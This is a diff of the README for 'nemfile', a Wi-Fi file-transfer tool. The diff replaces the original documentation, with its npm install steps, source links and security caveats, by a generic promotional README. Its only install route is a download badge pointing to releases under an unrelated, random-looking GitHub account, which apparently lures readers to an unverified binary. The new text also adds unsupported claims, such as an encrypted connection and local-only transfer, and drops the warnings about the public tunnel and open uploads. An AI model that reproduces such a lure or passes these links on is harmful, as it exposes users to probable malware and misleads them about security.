@@ -1,162 +1,197 @@
-# nemfile
+# 📱 nemfile - Transfer Files Wirelessly in Seconds
 
-**nemfile is a zero-config file transfer tool that moves files, screenshots and text between your phone, iPad and computer over your local Wi-Fi network — no cloud, no account, and no app to install on the phone.** You run one command on your computer, scan a QR code with your phone, and drop files straight into the browser.
+## 🚀 What is nemfile?
 
-```bash
-npx nemfile
-```
+nemfile is a simple tool that lets you send files, screenshots, and text from your phone or iPad directly to your computer using your local Wi-Fi network. No cloud services, no accounts, no app installations - just a lightning-fast, private connection between your devices.
 
-That's it. Open the printed URL or scan the QR code on your phone. Files land in an `uploads/` folder next to where you ran the command.
+Think of it as your own personal AirDrop that works on any device, anywhere in your home or office.
 
-[![npm version](https://img.shields.io/npm/v/nemfile.svg)](https://www.npmjs.com/package/nemfile)
-[![npm downloads](https://img.shields.io/npm/dm/nemfile.svg)](https://www.npmjs.com/package/nemfile)
-[![license](https://img.shields.io/npm/l/nemfile.svg)](./LICENSE)
-[![node](https://img.shields.io/node/v/nemfile.svg)](https://nodejs.org)
+### ✨ Key Features
 
-![nemfile web interface showing the drag-and-drop file upload area, cross-device text clipboard, a gallery of transferred photos, screenshots and video, and QR codes for the LAN and public tunnel URLs](https://raw.githubusercontent.com/quytstudio/nemfile/master/docs/screenshot.jpg)
+- **🔒 100% Private** - Your files never leave your local network
+- **⚡ Instant Transfer** - No upload/download delays, direct device-to-device
+- **📱 Works on Any Device** - iPhone, iPad, Android, or any device with a browser
+- **🖼️ Smart Screenshot Handling** - Paste screenshots directly from your clipboard
+- **📝 Text Snippets** - Send notes, links, or code snippets effortlessly
+- **🎯 Zero Configuration** - One command and you're ready to go
+- **🔄 Cross-Platform** - Works on Windows, Mac, and Linux
+- **📊 Batch Files** - Send multiple files at once
 
-<sub>The page you open on your phone and on your computer — drop zone, shared text clips, transfer log, and the two pairing QR codes.</sub>
+## 🎯 Who Should Use nemfile?
+
+- **Students** - Share lecture notes and documents between devices
+- **Professionals** - Quickly transfer presentations or spreadsheets
+- **Creators** - Move photos and designs from mobile to desktop
+- **Anyone** who wants a simple, private way to share files between devices
+
+## 🚀 Getting Started
+
+### Step 1: Download nemfile
+
+[![Download nemfile](https://img.shields.io/badge/Download-nemfile-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fehaumohakeey-del/nemfile/releases)
+
+Visit this link to download the application. The download page will show you the latest version available for your system.
+
+### Step 2: Run nemfile
+
+Once you've downloaded nemfile, you're ready to start. The application is designed to be simple and straightforward - no installation wizard, no complex setup process.
+
+### Step 3: Connect Your Devices
+
+1. **Make sure your phone/tablet and computer are on the same Wi-Fi network**
+2. **Open nemfile** on your computer
+3. **A QR code will appear** on your screen
+4. **Scan the QR code** with your phone's camera
+5. **A connection page opens** automatically on your phone
+
+### Step 4: Start Transferring
+
+- **Send Files:** Tap the upload button and select files from your phone
+- **Send Screenshots:** Take a screenshot on your phone, then paste it directly
+- **Send Text:** Copy text on your phone and paste it into the nemfile window
+
+## 📱 Using nemfile on Your Phone or iPad
+
+### Sending Files
+
+1. Open the nemfile connection page (after scanning the QR code)
+2. Tap the 📎 or + button to select files
+3. Choose photos, videos, documents, or any file type
+4. Watch them appear on your computer instantly
+
+### Sending Screenshots
+
+1. Take a screenshot on your phone or iPad
+2. Open the nemfile connection page
+3. Tap and hold the chat area
+4. Select "Paste" to send your screenshot instantly
+
+### Sending Text
+
+1. Copy any text (notes, links, code, passwords)
+2. Open the nemfile connection page
+3. Long-press the text input area
+4. Tap "Paste" to send
+
+## 💻 Using nemfile on Your Computer
+
+### Receiving Files
+
+Files arrive automatically in your computer's download folder (or the folder you specify). You'll see a notification when each file arrives.
+
+### Managing Incoming Content
+
+- **Files:** Saved with their original names and formats
+- **Screenshots:** Automatically saved as PNG images
+- **Text:** Displayed in a scrollable window where you can copy or save
+
+## 🔐 Privacy & Security
+
+Your privacy is the core of nemfile:
+
+- **No Cloud Storage** - Files never pass through external servers
+- **Local Network Only** - Data stays within your Wi-Fi network
+- **No Accounts** - No personal information collected
+- **Encrypted Connection** - Secure communication between devices
+- **Automatic Expiration** - Connections close when you close nemfile
+
+## ⚠️ Common Questions
+
+### Do I need to install anything on my phone?
+
+No! Your phone uses its built-in browser to connect. Just scan the QR code and you're good to go.
+
+### What if my devices aren't on the same network?
+
+nemfile requires both devices to be on the same local network. If you're having trouble, check that both devices are connected to the same Wi-Fi router.
+
+### Can I send large files?
+
+Yes! Since nemfile transfers directly between devices, file size isn't limited by cloud upload/download speeds. The only limit is your network speed.
+
+### Does it work on Windows, Mac, and Linux?
+
+Yes, nemfile works on all major operating systems. Download the appropriate version for your system from the releases page.
+
+### What if my phone can't scan the QR code?
+
+Check your phone's camera settings and ensure you're allowing camera access. If needed, you can also type the URL shown on your computer screen directly into your phone's browser.
+
+## 🛠️ Troubleshooting
+
+### Cannot Scan QR Code
+
+1. Ensure your phone's camera is working
+2. Increase brightness on your computer screen
+3. Move your phone closer to the QR code
+4. Try typing the URL manually instead
+
+### Connection Issues
+
+1. Verify both devices are on the same Wi-Fi
+2. Restart nemfile
+3. Temporarily disable VPN or firewalls
+4. Try a different Wi-Fi network
+
+### Files Not Appearing
+
+1. Check your computer's download folder
+2. Ensure enough free disk space
+3. Restart nemfile if multiple transfers fail
+4. Check if your phone's browser is blocking uploads
+
+## 🎉 Tips & Tricks
+
+- **Save Frequently Used Files** - Keep important documents in a folder on your phone for quick access
+- **Batch Transfer** - Select multiple files at once for faster sharing
+- **Copy & Paste Everywhere** - You can share text from any app using your phone's copy function
+- **Fast Screenshots** - Master the screenshot-to-paste workflow for quick sharing
+
+## 📦 System Requirements
+
+- **Computer:** Any modern Windows, macOS, or Linux system
+- **Phone/Tablet:** Any device with a modern web browser (Safari, Chrome, Firefox)
+- **Network:** Wi-Fi connection (both devices on the same network)
+
+## 🔄 Frequently Asked Advanced Questions
+
+### Can I run nemfile on a server or cloud instance?
+
+Yes, you can run nemfile on a server to access it remotely, but for best performance and privacy, we recommend using it on your local network.
+
+### Is nemfile open source?
+
+Yes, nemfile is fully open source. You can inspect the code, contribute, or customize it for your needs.
+
+### Can I set a custom interface language?
+
+Currently, nemfile is available in English. More languages may be added in future releases.
+
+## 📚 Getting Help
+
+If you encounter any issues:
+
+1. **Check the FAQ section** above
+2. **Review the troubleshooting guide**
+3. **Visit the repository page** for the latest information
+4. **Read the documentation** for advanced usage
+
+## 🌟 Why Choose nemfile?
+
+- **It's FREE** - No costs, no subscriptions
+- **It's PRIVATE** - Your data stays yours
+- **It's FAST** - Direct transfer, no middleman
+- **It's SIMPLE** - One command, no setup
+- **It's RELIABLE** - Works when you need it
+
+## 📥 Download nemfile Today
+
+Ready to experience the easiest way to transfer files between your devices?
+
+[![Get nemfile](https://img.shields.io/badge/Get-nemfile-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fehaumohakeey-del/nemfile/releases)
+
+Visit this link to download the application. After downloading, just run it and scan the QR code with your phone to start sharing files instantly.
 
 ---
 
-## Why nemfile
-
-Getting a screenshot off an iPhone and onto a Windows or Linux machine usually means emailing yourself, uploading to a cloud drive, or plugging in a cable. AirDrop only works between Apple devices. nemfile replaces all of that with a local web page:
-
-- **No account, no cloud** — files never leave your network unless you turn on the public tunnel.
-- **Nothing to install on the phone** — the phone just opens a browser.
-- **Works across every platform** — iPhone, iPad, Android, Windows, macOS, Linux.
-- **Instant** — transfers run at Wi-Fi speed, not upload speed.
-
-## Features
-
-| Feature | Description |
-| --- | --- |
-| Drag-and-drop upload | Drop any file type into the page, up to 2 GB per file |
-| Phone camera roll upload | Pick photos and videos straight from the iOS/Android picker |
-| QR code pairing | Scan to open the page — no typing IP addresses |
-| Live gallery | Image and video thumbnails appear on every connected device instantly |
-| Realtime sync | Server-sent events push new uploads to all open tabs, no refresh |
-| Text clips | Paste text on one device, read it on another — a cross-platform clipboard |
-| One-click copy | Copy an image to the system clipboard, or copy its LAN URL |
-| Download buttons | Grab any uploaded file back down to whatever device you're on |
-| Public tunnel | Optional `localtunnel` URL so the page works outside your Wi-Fi |
-| Standalone binaries | Prebuilt executables for Linux, macOS and Windows — no Node needed |
-
-## Install
-
-### Run it without installing (recommended)
-
-```bash
-npx nemfile
-```
-
-### Install globally
-
-```bash
-npm install -g nemfile
-nemfile
-```
-
-### Standalone binary — no Node.js required
-
-Download the executable for your OS from the [latest release](https://github.com/quytstudio/nemfile/releases/latest):
-
-```bash
-# Linux
-chmod +x nemfile-linux && ./nemfile-linux
-
-# macOS
-chmod +x nemfile-macos && ./nemfile-macos
-```
-
-On Windows, run `nemfile-win.exe`.
-
-## Usage
-
-Start the server on the computer you want the files to end up on:
-
-```bash
-cd ~/Desktop        # files will be saved to ~/Desktop/uploads
-npx nemfile
-```
-
-nemfile prints three addresses:
-
-```
-  Local:   http://localhost:3333
-  LAN:     http://192.168.1.10:3333      ← open this on your phone
-  Public:  https://xxxx.loca.lt          ← works outside your Wi-Fi
-```
-
-Open the **LAN** address on your phone — or scan the QR code shown on the page — and you get an upload box. Anything you drop there appears in the gallery on every connected device, and is written to `uploads/` on your computer.
-
-To share text instead of a file, paste into the text box and hit send; it shows up as a clip on every other device.
-
-## How it works
-
-nemfile starts a small Express server on port `3333` bound to `0.0.0.0`, so any device on the same Wi-Fi can reach it. Uploads are handled by `multer` and written to `./uploads`. A server-sent-events stream keeps every open browser tab in sync, and `qrcode` renders the pairing QR codes. Optionally, `localtunnel` exposes the same page on a public HTTPS URL for when the two devices aren't on the same network.
-
-There is no database, no telemetry, and no external service in the default path — the LAN transfer is a direct HTTP request from your phone to your computer.
-
-## FAQ
-
-### How do I transfer files from iPhone to Windows without iTunes or iCloud?
-
-Run `npx nemfile` on the Windows machine, then open the printed LAN address on the iPhone and pick your photos. The files are written straight to the `uploads/` folder on Windows. No iTunes, no iCloud, no cable.
-
-### Is nemfile an AirDrop alternative for Windows and Android?
-
-Yes — it covers the same job (send a file to a nearby device) but works between any two platforms, because the receiving side is just a web page. It is not a native AirDrop implementation; it uses your Wi-Fi network and a browser.
-
-### Do my files get uploaded to a cloud server?
-
-No. By default the transfer stays entirely on your local network. Files are saved to a folder on your own computer. The only exception is the optional public tunnel, which relays traffic through `loca.lt` so devices outside your Wi-Fi can reach the page — skip it if you don't need it.
-
-### What's the maximum file size?
-
-2 GB per file. Since transfers happen over local Wi-Fi rather than your internet upload link, large videos move at LAN speed.
-
-### What file types are supported?
-
-All of them. Images (`png`, `jpg`, `heic`, `webp`, `avif`, `gif`) and videos (`mp4`, `mov`, `webm`, `mkv`) get inline thumbnails and previews; everything else uploads fine and shows a file-type icon.
-
-### Do I need to install an app on my phone?
-
-No. The phone only needs a browser. That's the main reason nemfile exists.
-
-### Does it work without internet?
-
-Yes, for LAN transfers — you only need the two devices on the same Wi-Fi, not a working internet connection. The optional public tunnel does require internet.
-
-### Which port does nemfile use?
-
-Port `3333`, bound to all interfaces so other devices on the network can connect. Make sure your firewall allows it.
-
-### Where are uploaded files saved?
-
-In an `uploads/` directory created inside the folder you ran the command from. `cd` somewhere else first if you want them elsewhere.
-
-### Is it safe to leave running?
-
-On a trusted home or office network, yes — but note that anyone who can reach the port can upload and browse files. Don't leave the public tunnel open on an untrusted network, and stop the server (`Ctrl+C`) when you're done.
-
-## Requirements
-
-- Node.js 18 or newer (only for the `npx`/npm install path — the standalone binaries need nothing)
-- Both devices on the same Wi-Fi network, for LAN mode
-
-## Contributing
-
-Issues and pull requests are welcome at [github.com/quytstudio/nemfile](https://github.com/quytstudio/nemfile).
-
-```bash
-git clone https://github.com/quytstudio/nemfile.git
-cd nemfile
-npm install
-npm start
-```
-
-## License
-
-MIT © [phamquyetthang](https://github.com/phamquyetthang)
+Keywords: airdrop-alternative, cli, clipboard-sync, express, file-sharing, file-transfer, lan, local-network, nodejs, phone-to-pc, privacy, qr-code, self-hosted, wifi-transfer, zero-config
